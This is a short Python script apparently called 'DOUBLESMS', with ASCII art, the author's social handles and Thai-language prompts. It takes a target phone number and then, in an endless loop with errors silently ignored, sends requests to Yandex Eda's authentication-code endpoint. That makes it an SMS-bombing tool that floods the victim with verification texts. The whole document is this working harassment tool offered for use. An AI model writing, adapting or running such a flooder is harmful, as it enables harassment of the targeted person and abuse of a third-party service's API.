import os, sys, time, requests, random
import colorama
from colorama import Fore

os.system("clear")
time.sleep(1)
os.system('figlet -f ASCII-Shadow DOUBLESMS | lolcat')
print(Fore.GREEN + '''
⠀⠀⠀⠀⣠⣶⡾⠏⠉⠙⠳⢦⡀⠀⠀⠀
⠀⠀⠀⣴⠿⠏⠀⠀⠀⠀⠀⠀⢳⡀⠀
⠀⠀⢠⣟⣋⡀⢀⣀⣀⡀⠀⣀⡀⣧⠀      [+] NAME : TOEY
⠀⠀⢸⣯⡭⠁⠸⣛⣟⠆⡴⣻⡲⣿⠀
⠀⠀⣟⣿⡭⠀⠀⠀⠀⠀⢱⠀⠀⣿⠀      [+] FACEBOOK : Toey monifire
⠀⠀⠙⢿⣯⠄⠀⠀⠀⢀⡀⠀⠀⡿⠀⠀
⠀⠀⠀⠀⠹⣶⠆⠀⠀⠀⠀⠀⡴⠃⠀⠀     [+] YOUTUBE : MONIFIRE AMV
⠀⠀⠀⠀⠀⢸⣷⡦⢤⡤⢤⣞⣁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣤⣴⣿⣏⠁⠀⠀⠸⣏⢯⣷⣖⣦⡀⠀⠀⠀⠀[+] TIKTOK : monifire_amv⠀⠀
⢀⣾⣽⣿⣿⣿⣿⠛⢲⣶⣾⢉⡷⣿⣿⠵⣿⠀⠀⠀⠀⠀⠀
⣼⣿⠍⠉⣿⡭⠉⠙⢺⣇⣼⡏⠀⠀⠀⣄⢸⠀⠀⠀⠀⠀⠀
⣿⣿⣧⣀⣿.........⣀⣰
''')

try:
    phone = sys.argv[1]
except:
    print()
    print("ตัวอย่าง 66817******")
    print()
    phone = input("ใสเบอร์เป้าหมาย : ")
_phone = phone
np = "\033[37m\033[47m_\033[0m"
np2 = "\033[47m_____\033[30m                         \033[0m\033[44m\033[34m_ \033[0m"
os.system("clear")
os.system('figlet -f ASCII-Shadow DOUBLESMS | lolcat -a')
block = input("กด ERTER เพื่อส่ง ")
print(block)
os.system("clear")
os.system('figlet -f ASCII-Shadow DOUBLESMS | lolcat -a')
print("กำลังส่งรอสักครู่...")

while True:

    try:
        requests.post("https://eda.yandex/api/v1/user/request_authentication_code", json={"phone_number": "+"+phone})

    except:

        pass